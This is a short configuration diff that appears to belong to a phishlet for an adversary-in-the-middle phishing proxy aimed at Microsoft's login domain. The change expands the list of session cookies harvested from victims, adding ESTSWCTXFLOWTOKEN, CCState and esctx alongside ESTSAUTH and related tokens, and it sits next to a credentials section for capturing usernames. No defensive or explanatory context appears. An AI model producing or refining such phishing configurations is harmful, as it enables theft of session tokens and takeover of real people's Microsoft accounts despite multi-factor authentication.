@@ -18,7 +18,7 @@ sub_filters:
 
 auth_tokens:
   - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH:always', 'ESTSAUTHPERSISTENT:always', 'SignInStateCookie:always']
+    keys: ['ESTSWCTXFLOWTOKEN:always', 'ESTSAUTH:always', 'ESTSAUTHPERSISTENT:always', 'SignInStateCookie:always', 'CCState:always', 'esctx:always']
     type: 'cookie'
 credentials:
   username:
